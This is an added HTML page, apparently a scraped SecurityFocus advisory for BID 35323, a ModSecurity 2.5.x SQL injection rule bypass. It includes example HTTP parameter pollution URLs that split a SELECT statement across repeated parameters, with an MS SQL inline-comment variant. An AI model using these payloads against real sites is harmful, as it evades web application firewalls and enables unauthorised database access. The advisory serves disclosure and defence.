@@ -1,0 +1,104 @@
+#SpeeDr00t@Black Falcon<br>#bid35323<p><b><span style="font-size: 18pt;">ModSecurity SQL Injection Rule Security Bypass Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35323/info">info</a><br><a href="http://www.securityfocus.com/bid/35323/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35323/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35323/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35323/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35323
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 11 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 15 2009 08:19PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lavakumar Kuppan
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Breach Security ModSecurity 2.5.9 <br/>
+					
+				
+					Breach Security ModSecurity 2.5.8 <br/>
+					
+				
+					Breach Security ModSecurity 2.5.6 <br/>
+					
+				
+					Breach Security ModSecurity 2.5.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples are available to demonstrate this issue:<br/><br/>http://www.example.com/search.aspx?value=select 1&amp;amp;value=2,3 from table<br/><br/>ModSecurity Interpretation:<br/>   value = select 1<br/>   value = 2,3 from table<br/>Web Application Interpretation:<br/>   value select 1,2,3 from table<br/><br/>The attack can be made more flexible by using the inline comment feature in MS SQL servers:<br/><br/>http://www.example.com/search.aspx?value=select/*&amp;amp;value=*/1,2,3/*&amp;amp;value=*/from/*&amp;amp;value=*/table<br/><br/>ModSecurity Interpretation:<br/>   value=select/*<br/>   value=*/1,2,3/*<br/>   value=*/from/*<br/>   value=*/table<br/>Web Application Interpretation:<br/>   value = select/*,*/1,2,3/*,*/from/*,*/table
+	
+		<ul>
+</ul>
+</div>
